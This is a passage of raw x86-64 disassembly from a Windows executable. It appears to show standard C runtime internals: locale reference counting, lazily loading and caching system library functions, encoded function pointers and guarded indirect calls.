   14000952c:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   140009533:	e8 b4 df ff ff       	call   0x1400074ec
   140009538:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000953f:	bf 80 00 00 00       	mov    $0x80,%edi
   140009544:	48 2b cf             	sub    %rdi,%rcx
   140009547:	e8 a0 df ff ff       	call   0x1400074ec
   14000954c:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140009553:	48 2b cf             	sub    %rdi,%rcx
   140009556:	e8 91 df ff ff       	call   0x1400074ec
   14000955b:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   140009562:	e8 85 df ff ff       	call   0x1400074ec
   140009567:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   14000956e:	e8 a5 00 00 00       	call   0x140009618
   140009573:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   14000957a:	bd 06 00 00 00       	mov    $0x6,%ebp
   14000957f:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   140009583:	48 8d 05 de 01 01 00 	lea    0x101de(%rip),%rax        # 0x140019768
   14000958a:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   14000958e:	74 1a                	je     0x1400095aa
   140009590:	48 8b 0f             	mov    (%rdi),%rcx
   140009593:	48 85 c9             	test   %rcx,%rcx
   140009596:	74 12                	je     0x1400095aa
   140009598:	83 39 00             	cmpl   $0x0,(%rcx)
   14000959b:	75 0d                	jne    0x1400095aa
   14000959d:	e8 4a df ff ff       	call   0x1400074ec
   1400095a2:	48 8b 0e             	mov    (%rsi),%rcx
   1400095a5:	e8 42 df ff ff       	call   0x1400074ec
   1400095aa:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   1400095af:	74 13                	je     0x1400095c4
   1400095b1:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1400095b5:	48 85 c9             	test   %rcx,%rcx
   1400095b8:	74 0a                	je     0x1400095c4
   1400095ba:	83 39 00             	cmpl   $0x0,(%rcx)
   1400095bd:	75 05                	jne    0x1400095c4
   1400095bf:	e8 28 df ff ff       	call   0x1400074ec
   1400095c4:	48 83 c6 08          	add    $0x8,%rsi
   1400095c8:	48 83 c7 20          	add    $0x20,%rdi
   1400095cc:	48 83 ed 01          	sub    $0x1,%rbp
   1400095d0:	75 b1                	jne    0x140009583
   1400095d2:	48 8b cb             	mov    %rbx,%rcx
   1400095d5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400095da:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400095df:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400095e4:	48 83 c4 20          	add    $0x20,%rsp
   1400095e8:	5f                   	pop    %rdi
   1400095e9:	e9 fe de ff ff       	jmp    0x1400074ec
   1400095ee:	cc                   	int3
   1400095ef:	cc                   	int3
   1400095f0:	48 85 c9             	test   %rcx,%rcx
   1400095f3:	74 1c                	je     0x140009611
   1400095f5:	48 8d 05 e4 71 00 00 	lea    0x71e4(%rip),%rax        # 0x1400107e0
   1400095fc:	48 3b c8             	cmp    %rax,%rcx
   1400095ff:	74 10                	je     0x140009611
   140009601:	b8 01 00 00 00       	mov    $0x1,%eax
   140009606:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000960d:	00 
   14000960e:	ff c0                	inc    %eax
   140009610:	c3                   	ret
   140009611:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140009616:	c3                   	ret
   140009617:	cc                   	int3
   140009618:	48 85 c9             	test   %rcx,%rcx
   14000961b:	74 30                	je     0x14000964d
   14000961d:	53                   	push   %rbx
   14000961e:	48 83 ec 20          	sub    $0x20,%rsp
   140009622:	48 8d 05 b7 71 00 00 	lea    0x71b7(%rip),%rax        # 0x1400107e0
   140009629:	48 8b d9             	mov    %rcx,%rbx
   14000962c:	48 3b c8             	cmp    %rax,%rcx
   14000962f:	74 17                	je     0x140009648
   140009631:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   140009637:	85 c0                	test   %eax,%eax
   140009639:	75 0d                	jne    0x140009648
   14000963b:	e8 74 fa ff ff       	call   0x1400090b4
   140009640:	48 8b cb             	mov    %rbx,%rcx
   140009643:	e8 a4 de ff ff       	call   0x1400074ec
   140009648:	48 83 c4 20          	add    $0x20,%rsp
   14000964c:	5b                   	pop    %rbx
   14000964d:	c3                   	ret
   14000964e:	cc                   	int3
   14000964f:	cc                   	int3
   140009650:	48 85 c9             	test   %rcx,%rcx
   140009653:	74 1a                	je     0x14000966f
   140009655:	48 8d 05 84 71 00 00 	lea    0x7184(%rip),%rax        # 0x1400107e0
   14000965c:	48 3b c8             	cmp    %rax,%rcx
   14000965f:	74 0e                	je     0x14000966f
   140009661:	83 c8 ff             	or     $0xffffffff,%eax
   140009664:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   14000966b:	00 
   14000966c:	ff c8                	dec    %eax
   14000966e:	c3                   	ret
   14000966f:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140009674:	c3                   	ret
   140009675:	cc                   	int3
   140009676:	cc                   	int3
   140009677:	cc                   	int3
   140009678:	48 83 ec 28          	sub    $0x28,%rsp
   14000967c:	48 85 c9             	test   %rcx,%rcx
   14000967f:	0f 84 96 00 00 00    	je     0x14000971b
   140009685:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140009689:	f0 44 01 49 10       	lock add %r9d,0x10(%rcx)
   14000968e:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140009695:	48 85 c0             	test   %rax,%rax
   140009698:	74 04                	je     0x14000969e
   14000969a:	f0 44 01 08          	lock add %r9d,(%rax)
   14000969e:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   1400096a5:	48 85 c0             	test   %rax,%rax
   1400096a8:	74 04                	je     0x1400096ae
   1400096aa:	f0 44 01 08          	lock add %r9d,(%rax)
   1400096ae:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   1400096b5:	48 85 c0             	test   %rax,%rax
   1400096b8:	74 04                	je     0x1400096be
   1400096ba:	f0 44 01 08          	lock add %r9d,(%rax)
   1400096be:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   1400096c5:	48 85 c0             	test   %rax,%rax
   1400096c8:	74 04                	je     0x1400096ce
   1400096ca:	f0 44 01 08          	lock add %r9d,(%rax)
   1400096ce:	48 8d 41 38          	lea    0x38(%rcx),%rax
   1400096d2:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400096d8:	48 8d 15 89 00 01 00 	lea    0x10089(%rip),%rdx        # 0x140019768
   1400096df:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   1400096e3:	74 0c                	je     0x1400096f1
   1400096e5:	48 8b 10             	mov    (%rax),%rdx
   1400096e8:	48 85 d2             	test   %rdx,%rdx
   1400096eb:	74 04                	je     0x1400096f1
   1400096ed:	f0 44 01 0a          	lock add %r9d,(%rdx)
   1400096f1:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   1400096f6:	74 0d                	je     0x140009705
   1400096f8:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   1400096fc:	48 85 d2             	test   %rdx,%rdx
   1400096ff:	74 04                	je     0x140009705
   140009701:	f0 44 01 0a          	lock add %r9d,(%rdx)
   140009705:	48 83 c0 20          	add    $0x20,%rax
   140009709:	49 83 e8 01          	sub    $0x1,%r8
   14000970d:	75 c9                	jne    0x1400096d8
   14000970f:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   140009716:	e8 35 ff ff ff       	call   0x140009650
   14000971b:	48 83 c4 28          	add    $0x28,%rsp
   14000971f:	c3                   	ret
   140009720:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009725:	57                   	push   %rdi
   140009726:	48 83 ec 20          	sub    $0x20,%rsp
   14000972a:	e8 e5 d3 ff ff       	call   0x140006b14
   14000972f:	48 8d b8 90 00 00 00 	lea    0x90(%rax),%rdi
   140009736:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   14000973c:	8b 05 ce 00 01 00    	mov    0x100ce(%rip),%eax        # 0x140019810
   140009742:	85 c8                	test   %ecx,%eax
   140009744:	74 08                	je     0x14000974e
   140009746:	48 8b 1f             	mov    (%rdi),%rbx
   140009749:	48 85 db             	test   %rbx,%rbx
   14000974c:	75 2c                	jne    0x14000977a
   14000974e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140009753:	e8 50 f1 ff ff       	call   0x1400088a8
   140009758:	90                   	nop
   140009759:	48 8b 15 88 0e 01 00 	mov    0x10e88(%rip),%rdx        # 0x14001a5e8
   140009760:	48 8b cf             	mov    %rdi,%rcx
   140009763:	e8 28 00 00 00       	call   0x140009790
   140009768:	48 8b d8             	mov    %rax,%rbx
   14000976b:	b9 04 00 00 00       	mov    $0x4,%ecx
   140009770:	e8 87 f1 ff ff       	call   0x1400088fc
   140009775:	48 85 db             	test   %rbx,%rbx
   140009778:	74 0e                	je     0x140009788
   14000977a:	48 8b c3             	mov    %rbx,%rax
   14000977d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009782:	48 83 c4 20          	add    $0x20,%rsp
   140009786:	5f                   	pop    %rdi
   140009787:	c3                   	ret
   140009788:	e8 fb cd ff ff       	call   0x140006588
   14000978d:	90                   	nop
   14000978e:	cc                   	int3
   14000978f:	cc                   	int3
   140009790:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009795:	57                   	push   %rdi
   140009796:	48 83 ec 20          	sub    $0x20,%rsp
   14000979a:	48 8b fa             	mov    %rdx,%rdi
   14000979d:	48 85 d2             	test   %rdx,%rdx
   1400097a0:	74 46                	je     0x1400097e8
   1400097a2:	48 85 c9             	test   %rcx,%rcx
   1400097a5:	74 41                	je     0x1400097e8
   1400097a7:	48 8b 19             	mov    (%rcx),%rbx
   1400097aa:	48 3b da             	cmp    %rdx,%rbx
   1400097ad:	75 05                	jne    0x1400097b4
   1400097af:	48 8b c7             	mov    %rdi,%rax
   1400097b2:	eb 36                	jmp    0x1400097ea
   1400097b4:	48 89 39             	mov    %rdi,(%rcx)
   1400097b7:	48 8b cf             	mov    %rdi,%rcx
   1400097ba:	e8 2d fc ff ff       	call   0x1400093ec
   1400097bf:	48 85 db             	test   %rbx,%rbx
   1400097c2:	74 eb                	je     0x1400097af
   1400097c4:	48 8b cb             	mov    %rbx,%rcx
   1400097c7:	e8 ac fe ff ff       	call   0x140009678
   1400097cc:	83 7b 10 00          	cmpl   $0x0,0x10(%rbx)
   1400097d0:	75 dd                	jne    0x1400097af
   1400097d2:	48 8d 05 27 fe 00 00 	lea    0xfe27(%rip),%rax        # 0x140019600
   1400097d9:	48 3b d8             	cmp    %rax,%rbx
   1400097dc:	74 d1                	je     0x1400097af
   1400097de:	48 8b cb             	mov    %rbx,%rcx
   1400097e1:	e8 92 fc ff ff       	call   0x140009478
   1400097e6:	eb c7                	jmp    0x1400097af
   1400097e8:	33 c0                	xor    %eax,%eax
   1400097ea:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400097ef:	48 83 c4 20          	add    $0x20,%rsp
   1400097f3:	5f                   	pop    %rdi
   1400097f4:	c3                   	ret
   1400097f5:	cc                   	int3
   1400097f6:	cc                   	int3
   1400097f7:	cc                   	int3
   1400097f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400097fd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009802:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009807:	57                   	push   %rdi
   140009808:	41 54                	push   %r12
   14000980a:	41 55                	push   %r13
   14000980c:	41 56                	push   %r14
   14000980e:	41 57                	push   %r15
   140009810:	48 83 ec 20          	sub    $0x20,%rsp
   140009814:	44 8b f9             	mov    %ecx,%r15d
   140009817:	4c 8d 35 e2 67 ff ff 	lea    -0x981e(%rip),%r14        # 0x140000000
   14000981e:	4d 8b e1             	mov    %r9,%r12
   140009821:	49 8b e8             	mov    %r8,%rbp
   140009824:	4c 8b ea             	mov    %rdx,%r13
   140009827:	4b 8b 8c fe 90 a6 01 	mov    0x1a690(%r14,%r15,8),%rcx
   14000982e:	00 
   14000982f:	4c 8b 05 0a f8 00 00 	mov    0xf80a(%rip),%r8        # 0x140019040
   140009836:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   14000983a:	41 8b c0             	mov    %r8d,%eax
   14000983d:	49 8b d0             	mov    %r8,%rdx
   140009840:	48 33 d1             	xor    %rcx,%rdx
   140009843:	83 e0 3f             	and    $0x3f,%eax
   140009846:	8a c8                	mov    %al,%cl
   140009848:	48 d3 ca             	ror    %cl,%rdx
   14000984b:	48 3b d7             	cmp    %rdi,%rdx
   14000984e:	0f 84 ea 00 00 00    	je     0x14000993e
   140009854:	48 85 d2             	test   %rdx,%rdx
   140009857:	74 08                	je     0x140009861
   140009859:	48 8b c2             	mov    %rdx,%rax
   14000985c:	e9 df 00 00 00       	jmp    0x140009940
   140009861:	49 3b ec             	cmp    %r12,%rbp
   140009864:	0f 84 b9 00 00 00    	je     0x140009923
   14000986a:	8b 75 00             	mov    0x0(%rbp),%esi
   14000986d:	49 8b 9c f6 f0 a5 01 	mov    0x1a5f0(%r14,%rsi,8),%rbx
   140009874:	00 
   140009875:	48 85 db             	test   %rbx,%rbx
   140009878:	74 0e                	je     0x140009888
   14000987a:	48 3b df             	cmp    %rdi,%rbx
   14000987d:	0f 85 fa 00 00 00    	jne    0x14000997d
   140009883:	e9 87 00 00 00       	jmp    0x14000990f
   140009888:	4d 8b b4 f6 70 14 01 	mov    0x11470(%r14,%rsi,8),%r14
   14000988f:	00 
   140009890:	33 d2                	xor    %edx,%edx
   140009892:	49 8b ce             	mov    %r14,%rcx
   140009895:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   14000989b:	ff 15 4f 58 00 00    	call   *0x584f(%rip)        # 0x14000f0f0
   1400098a1:	48 8b d8             	mov    %rax,%rbx
   1400098a4:	48 85 c0             	test   %rax,%rax
   1400098a7:	0f 85 b0 00 00 00    	jne    0x14000995d
   1400098ad:	ff 15 dd 57 00 00    	call   *0x57dd(%rip)        # 0x14000f090
   1400098b3:	83 f8 57             	cmp    $0x57,%eax
   1400098b6:	75 45                	jne    0x1400098fd
   1400098b8:	8d 58 b0             	lea    -0x50(%rax),%ebx
   1400098bb:	49 8b ce             	mov    %r14,%rcx
   1400098be:	44 8b c3             	mov    %ebx,%r8d
   1400098c1:	48 8d 15 20 69 00 00 	lea    0x6920(%rip),%rdx        # 0x1400101e8
   1400098c8:	e8 a3 ce ff ff       	call   0x140006770
   1400098cd:	85 c0                	test   %eax,%eax
   1400098cf:	74 2c                	je     0x1400098fd
   1400098d1:	44 8b c3             	mov    %ebx,%r8d
   1400098d4:	48 8d 15 8d 80 00 00 	lea    0x808d(%rip),%rdx        # 0x140011968
   1400098db:	49 8b ce             	mov    %r14,%rcx
   1400098de:	e8 8d ce ff ff       	call   0x140006770
   1400098e3:	85 c0                	test   %eax,%eax
   1400098e5:	74 16                	je     0x1400098fd
   1400098e7:	45 33 c0             	xor    %r8d,%r8d
   1400098ea:	33 d2                	xor    %edx,%edx
   1400098ec:	49 8b ce             	mov    %r14,%rcx
   1400098ef:	ff 15 fb 57 00 00    	call   *0x57fb(%rip)        # 0x14000f0f0
   1400098f5:	48 8b d8             	mov    %rax,%rbx
   1400098f8:	48 85 c0             	test   %rax,%rax
   1400098fb:	75 60                	jne    0x14000995d
   1400098fd:	48 8b c7             	mov    %rdi,%rax
   140009900:	4c 8d 35 f9 66 ff ff 	lea    -0x9907(%rip),%r14        # 0x140000000
   140009907:	49 87 84 f6 f0 a5 01 	xchg   %rax,0x1a5f0(%r14,%rsi,8)
   14000990e:	00 
   14000990f:	48 83 c5 04          	add    $0x4,%rbp
   140009913:	49 3b ec             	cmp    %r12,%rbp
   140009916:	0f 85 4e ff ff ff    	jne    0x14000986a
   14000991c:	4c 8b 05 1d f7 00 00 	mov    0xf71d(%rip),%r8        # 0x140019040
   140009923:	41 8b c0             	mov    %r8d,%eax
   140009926:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000992b:	83 e0 3f             	and    $0x3f,%eax
   14000992e:	2b c8                	sub    %eax,%ecx
   140009930:	48 d3 cf             	ror    %cl,%rdi
   140009933:	49 33 f8             	xor    %r8,%rdi
   140009936:	4b 87 bc fe 90 a6 01 	xchg   %rdi,0x1a690(%r14,%r15,8)
   14000993d:	00 
   14000993e:	33 c0                	xor    %eax,%eax
   140009940:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009945:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000994a:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000994f:	48 83 c4 20          	add    $0x20,%rsp
   140009953:	41 5f                	pop    %r15
   140009955:	41 5e                	pop    %r14
   140009957:	41 5d                	pop    %r13
   140009959:	41 5c                	pop    %r12
   14000995b:	5f                   	pop    %rdi
   14000995c:	c3                   	ret
   14000995d:	48 8b c3             	mov    %rbx,%rax
   140009960:	4c 8d 35 99 66 ff ff 	lea    -0x9967(%rip),%r14        # 0x140000000
   140009967:	49 87 84 f6 f0 a5 01 	xchg   %rax,0x1a5f0(%r14,%rsi,8)
   14000996e:	00 
   14000996f:	48 85 c0             	test   %rax,%rax
   140009972:	74 09                	je     0x14000997d
   140009974:	48 8b cb             	mov    %rbx,%rcx
   140009977:	ff 15 63 57 00 00    	call   *0x5763(%rip)        # 0x14000f0e0
   14000997d:	49 8b d5             	mov    %r13,%rdx
   140009980:	48 8b cb             	mov    %rbx,%rcx
   140009983:	ff 15 5f 57 00 00    	call   *0x575f(%rip)        # 0x14000f0e8
   140009989:	48 85 c0             	test   %rax,%rax
   14000998c:	74 8e                	je     0x14000991c
   14000998e:	4c 8b 05 ab f6 00 00 	mov    0xf6ab(%rip),%r8        # 0x140019040
   140009995:	ba 40 00 00 00       	mov    $0x40,%edx
   14000999a:	41 8b c8             	mov    %r8d,%ecx
   14000999d:	83 e1 3f             	and    $0x3f,%ecx
   1400099a0:	2b d1                	sub    %ecx,%edx
   1400099a2:	8a ca                	mov    %dl,%cl
   1400099a4:	48 8b d0             	mov    %rax,%rdx
   1400099a7:	48 d3 ca             	ror    %cl,%rdx
   1400099aa:	49 33 d0             	xor    %r8,%rdx
   1400099ad:	4b 87 94 fe 90 a6 01 	xchg   %rdx,0x1a690(%r14,%r15,8)
   1400099b4:	00 
   1400099b5:	eb 89                	jmp    0x140009940
   1400099b7:	cc                   	int3
   1400099b8:	40 53                	rex push %rbx
   1400099ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400099be:	48 8b d9             	mov    %rcx,%rbx
   1400099c1:	4c 8d 0d f0 7f 00 00 	lea    0x7ff0(%rip),%r9        # 0x1400119b8
   1400099c8:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400099cd:	4c 8d 05 e0 7f 00 00 	lea    0x7fe0(%rip),%r8        # 0x1400119b4
   1400099d4:	48 8d 15 dd 7f 00 00 	lea    0x7fdd(%rip),%rdx        # 0x1400119b8
   1400099db:	e8 18 fe ff ff       	call   0x1400097f8
   1400099e0:	48 85 c0             	test   %rax,%rax
   1400099e3:	74 20                	je     0x140009a05
   1400099e5:	49 ba 70 c0 d1 34 da 	movabs $0xbdc017da34d1c070,%r10
   1400099ec:	17 c0 bd 
   1400099ef:	48 8b d3             	mov    %rbx,%rdx
   1400099f2:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   1400099f9:	48 83 c4 20          	add    $0x20,%rsp
   1400099fd:	5b                   	pop    %rbx
   1400099fe:	48 ff 25 63 58 00 00 	rex.W jmp *0x5863(%rip)        # 0x14000f268
   140009a05:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   140009a0a:	48 83 c4 20          	add    $0x20,%rsp
   140009a0e:	5b                   	pop    %rbx
   140009a0f:	c3                   	ret
   140009a10:	48 ff 25 b9 57 00 00 	rex.W jmp *0x57b9(%rip)        # 0x14000f1d0
   140009a17:	cc                   	int3
   140009a18:	48 ff 25 c9 57 00 00 	rex.W jmp *0x57c9(%rip)        # 0x14000f1e8
   140009a1f:	cc                   	int3
   140009a20:	48 ff 25 b1 57 00 00 	rex.W jmp *0x57b1(%rip)        # 0x14000f1d8
   140009a27:	cc                   	int3
   140009a28:	48 ff 25 b1 57 00 00 	rex.W jmp *0x57b1(%rip)        # 0x14000f1e0
   140009a2f:	cc                   	int3
   140009a30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009a35:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009a3a:	57                   	push   %rdi
   140009a3b:	48 83 ec 20          	sub    $0x20,%rsp
   140009a3f:	41 8b f0             	mov    %r8d,%esi
   140009a42:	4c 8d 0d 37 7f 00 00 	lea    0x7f37(%rip),%r9        # 0x140011980
   140009a49:	8b da                	mov    %edx,%ebx
   140009a4b:	4c 8d 05 26 7f 00 00 	lea    0x7f26(%rip),%r8        # 0x140011978
   140009a52:	48 8b f9             	mov    %rcx,%rdi
   140009a55:	48 8d 15 fc 67 00 00 	lea    0x67fc(%rip),%rdx        # 0x140010258
   140009a5c:	b9 0e 00 00 00       	mov    $0xe,%ecx
   140009a61:	e8 92 fd ff ff       	call   0x1400097f8
   140009a66:	48 85 c0             	test   %rax,%rax
   140009a69:	74 1a                	je     0x140009a85
   140009a6b:	49 ba 70 da d2 32 50 	movabs $0x82a03e5032d2da70,%r10
   140009a72:	3e a0 82 
   140009a75:	44 8b c6             	mov    %esi,%r8d
   140009a78:	8b d3                	mov    %ebx,%edx
   140009a7a:	48 8b cf             	mov    %rdi,%rcx
   140009a7d:	ff 15 e5 57 00 00    	call   *0x57e5(%rip)        # 0x14000f268
   140009a83:	eb 0b                	jmp    0x140009a90
   140009a85:	8b d3                	mov    %ebx,%edx
   140009a87:	48 8b cf             	mov    %rdi,%rcx
   140009a8a:	ff 15 28 56 00 00    	call   *0x5628(%rip)        # 0x14000f0b8
   140009a90:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009a95:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009a9a:	48 83 c4 20          	add    $0x20,%rsp
   140009a9e:	5f                   	pop    %rdi
   140009a9f:	c3                   	ret
   140009aa0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009aa5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009aaa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009aaf:	57                   	push   %rdi
   140009ab0:	48 83 ec 50          	sub    $0x50,%rsp
   140009ab4:	41 8b d9             	mov    %r9d,%ebx
   140009ab7:	49 8b f8             	mov    %r8,%rdi
   140009aba:	8b f2                	mov    %edx,%esi
   140009abc:	4c 8d 0d c5 7e 00 00 	lea    0x7ec5(%rip),%r9        # 0x140011988
   140009ac3:	48 8b e9             	mov    %rcx,%rbp
   140009ac6:	4c 8d 05 b3 7e 00 00 	lea    0x7eb3(%rip),%r8        # 0x140011980
   140009acd:	48 8d 15 b4 7e 00 00 	lea    0x7eb4(%rip),%rdx        # 0x140011988
   140009ad4:	b9 10 00 00 00       	mov    $0x10,%ecx
   140009ad9:	e8 1a fd ff ff       	call   0x1400097f8
   140009ade:	4c 8b d8             	mov    %rax,%r11
   140009ae1:	48 85 c0             	test   %rax,%rax
   140009ae4:	74 5f                	je     0x140009b45
   140009ae6:	49 ba 70 e2 57 50 62 	movabs $0xe3a11f625057e270,%r10
   140009aed:	1f a1 e3 
   140009af0:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   140009af7:	00 
   140009af8:	44 8b cb             	mov    %ebx,%r9d
   140009afb:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   140009b02:	00 
   140009b03:	4c 8b c7             	mov    %rdi,%r8
   140009b06:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140009b0d:	00 
   140009b0e:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140009b13:	8b d6                	mov    %esi,%edx
   140009b15:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140009b1a:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140009b21:	00 
   140009b22:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140009b27:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   140009b2e:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140009b32:	48 8b cd             	mov    %rbp,%rcx
   140009b35:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009b3a:	49 8b c3             	mov    %r11,%rax
   140009b3d:	ff 15 25 57 00 00    	call   *0x5725(%rip)        # 0x14000f268
   140009b43:	eb 32                	jmp    0x140009b77
   140009b45:	33 d2                	xor    %edx,%edx
   140009b47:	48 8b cd             	mov    %rbp,%rcx
   140009b4a:	e8 3d 00 00 00       	call   0x140009b8c
   140009b4f:	8b c8                	mov    %eax,%ecx
   140009b51:	44 8b cb             	mov    %ebx,%r9d
   140009b54:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   140009b5b:	4c 8b c7             	mov    %rdi,%r8
   140009b5e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009b62:	8b d6                	mov    %esi,%edx
   140009b64:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140009b6b:	00 
   140009b6c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009b71:	ff 15 79 56 00 00    	call   *0x5679(%rip)        # 0x14000f1f0
   140009b77:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140009b7c:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140009b81:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140009b86:	48 83 c4 50          	add    $0x50,%rsp
   140009b8a:	5f                   	pop    %rdi
   140009b8b:	c3                   	ret
   140009b8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009b91:	57                   	push   %rdi
   140009b92:	48 83 ec 20          	sub    $0x20,%rsp
   140009b96:	8b fa                	mov    %edx,%edi
   140009b98:	4c 8d 0d 01 7e 00 00 	lea    0x7e01(%rip),%r9        # 0x1400119a0
   140009b9f:	48 8b d9             	mov    %rcx,%rbx
   140009ba2:	48 8d 15 f7 7d 00 00 	lea    0x7df7(%rip),%rdx        # 0x1400119a0
   140009ba9:	b9 12 00 00 00       	mov    $0x12,%ecx
   140009bae:	4c 8d 05 e3 7d 00 00 	lea    0x7de3(%rip),%r8        # 0x140011998
   140009bb5:	e8 3e fc ff ff       	call   0x1400097f8
   140009bba:	48 85 c0             	test   %rax,%rax
   140009bbd:	74 17                	je     0x140009bd6
   140009bbf:	49 ba 70 32 d8 54 23 	movabs $0xeadd062354d83270,%r10
   140009bc6:	06 dd ea 
   140009bc9:	8b d7                	mov    %edi,%edx
   140009bcb:	48 8b cb             	mov    %rbx,%rcx
   140009bce:	ff 15 94 56 00 00    	call   *0x5694(%rip)        # 0x14000f268
   140009bd4:	eb 08                	jmp    0x140009bde
   140009bd6:	48 8b cb             	mov    %rbx,%rcx
   140009bd9:	e8 2e 15 00 00       	call   0x14000b10c
   140009bde:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009be3:	48 83 c4 20          	add    $0x20,%rsp
   140009be7:	5f                   	pop    %rdi
   140009be8:	c3                   	ret
   140009be9:	cc                   	int3
   140009bea:	cc                   	int3
   140009beb:	cc                   	int3
   140009bec:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   140009bf1:	48 8d 3d 98 0a 01 00 	lea    0x10a98(%rip),%rdi        # 0x14001a690
   140009bf8:	48 8d 05 81 0b 01 00 	lea    0x10b81(%rip),%rax        # 0x14001a780
   140009bff:	48 3b c7             	cmp    %rdi,%rax
   140009c02:	48 8b 05 37 f4 00 00 	mov    0xf437(%rip),%rax        # 0x140019040
   140009c09:	48 1b c9             	sbb    %rcx,%rcx
   140009c0c:	48 f7 d1             	not    %rcx
   140009c0f:	83 e1 1e             	and    $0x1e,%ecx
   140009c12:	f3 48 ab             	rep stos %rax,(%rdi)
   140009c15:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140009c1a:	b0 01                	mov    $0x1,%al
   140009c1c:	c3                   	ret
   140009c1d:	cc                   	int3
   140009c1e:	cc                   	int3
   140009c1f:	cc                   	int3
   140009c20:	40 53                	rex push %rbx
   140009c22:	48 83 ec 20          	sub    $0x20,%rsp
   140009c26:	84 c9                	test   %cl,%cl
   140009c28:	75 2f                	jne    0x140009c59
   140009c2a:	48 8d 1d bf 09 01 00 	lea    0x109bf(%rip),%rbx        # 0x14001a5f0
   140009c31:	48 8b 0b             	mov    (%rbx),%rcx
   140009c34:	48 85 c9             	test   %rcx,%rcx
   140009c37:	74 10                	je     0x140009c49
   140009c39:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140009c3d:	74 06                	je     0x140009c45
   140009c3f:	ff 15 9b 54 00 00    	call   *0x549b(%rip)        # 0x14000f0e0
   140009c45:	48 83 23 00          	andq   $0x0,(%rbx)
   140009c49:	48 83 c3 08          	add    $0x8,%rbx
   140009c4d:	48 8d 05 34 0a 01 00 	lea    0x10a34(%rip),%rax        # 0x14001a688
   140009c54:	48 3b d8             	cmp    %rax,%rbx
   140009c57:	75 d8                	jne    0x140009c31
   140009c59:	b0 01                	mov    $0x1,%al
   140009c5b:	48 83 c4 20          	add    $0x20,%rsp
   140009c5f:	5b                   	pop    %rbx
   140009c60:	c3                   	ret
